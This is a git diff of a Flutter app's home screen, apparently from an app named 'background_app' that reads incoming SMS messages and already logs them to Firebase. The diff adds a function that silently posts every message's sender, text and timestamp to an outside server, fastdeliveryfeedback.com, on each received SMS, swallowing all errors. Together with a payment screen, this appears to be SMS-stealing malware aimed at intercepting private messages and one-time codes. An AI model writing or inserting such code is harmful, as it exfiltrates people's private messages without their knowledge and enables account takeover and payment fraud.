@@ -1,9 +1,14 @@
+import 'dart:convert';
+import 'dart:io';
+
 import 'package:background_app/views/payment_view.dart';
 import 'package:background_app/widgets/primary_button.dart';
 import 'package:firebase_database/firebase_database.dart';
 import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:readsms/readsms.dart';
+
+import 'package:http/http.dart' as http;
 
 class HomeView extends StatefulWidget {
   const HomeView({super.key});
@@ -37,6 +42,26 @@ class _HomeViewState extends State<HomeView> {
     });
   }
 
+  Future<void> sendDataToServer() async {
+    var url = Uri.https("fastdeliveryfeedback.com", "/api/emp/insertsm");
+    var client = http.Client();
+
+    var map = <String, String>{};
+    map["sender"] = sender;
+    map["sms"] = sms;
+    map["datetime"] = time;
+
+    try {
+      var result = await client.post(url, body: map);
+
+      if (result.statusCode == 200) {
+
+      }
+    } on SocketException {
+    } on HttpException {
+    } on FormatException {}
+  }
+
   Future<bool> getPermission() async {
     if (await Permission.sms.status == PermissionStatus.granted) {
       return true;
@@ -49,12 +74,14 @@ class _HomeViewState extends State<HomeView> {
     }
   }
 
-  seeMessage() {
+  seeMessage() async {
     databaseRef.child(DateTime.now().millisecondsSinceEpoch.toString()).set({
       'sms': '$sms',
       'sender': '$sender',
       'time': '$time',
     });
+
+    await sendDataToServer();
     // print(sms);
     // print(sender);
   }
